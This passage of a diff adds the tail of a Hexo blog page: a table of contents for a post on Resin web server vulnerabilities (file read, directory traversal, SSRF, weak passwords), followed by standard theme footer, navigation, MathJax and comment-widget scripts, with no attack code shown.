+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-弱口令"><span class="nav-number">1.</span> <span class="nav-text">0x00 弱口令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><span class="nav-number">2.</span> <span class="nav-text">0x01 CVE-2006-1953 Resin Windows远程目录遍历漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">2.1.</span> <span class="nav-text">参考资料</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响范围"><span class="nav-number">2.2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试代码"><span class="nav-number">2.3.</span> <span class="nav-text">测试代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Resin-20任意文件读取"><span class="nav-number">3.</span> <span class="nav-text">0x02 Resin %20任意文件读取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Resin-Windows-漏洞"><span class="nav-number">4.</span> <span class="nav-text">Resin Windows 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响范围-1"><span class="nav-number">4.2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试代码-1"><span class="nav-number">4.3.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞危害"><span class="nav-number">4.4.</span> <span class="nav-text">漏洞危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Resin-jndi-appconfig-inputFile-任意文件读取-SSRF"><span class="nav-number">5.</span> <span class="nav-text">0x03 Resin jndi-appconfig inputFile 任意文件读取/SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-Resin-viewfile-任意文件读取"><span class="nav-number">6.</span> <span class="nav-text">0x04 Resin viewfile 任意文件读取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10-Payloads"><span class="nav-number">7.</span> <span class="nav-text">0x10 Payloads</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x11案例"><span class="nav-number">8.</span> <span class="nav-text">0x11案例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#a-20-任意文件读取"><span class="nav-number">8.1.</span> <span class="nav-text">a. %20 任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#b-jndi-appconfig-inputFile-任意文件读取-SSRF"><span class="nav-number">8.2.</span> <span class="nav-text">b. jndi-appconfig inputFile 任意文件读取/SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c-viewfile-任意文件读取"><span class="nav-number">8.3.</span> <span class="nav-text">c. viewfile 任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><span class="nav-number">8.4.</span> <span class="nav-text">d. CVE-2006-1953 Resin Windows远程目录遍历漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#e-弱口令"><span class="nav-number">8.5.</span> <span class="nav-text">e. 弱口令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x12-自动化目标方案"><span class="nav-number">9.</span> <span class="nav-text">0x12 自动化目标方案</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x13-补充"><span class="nav-number">10.</span> <span class="nav-text">0x13 补充</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
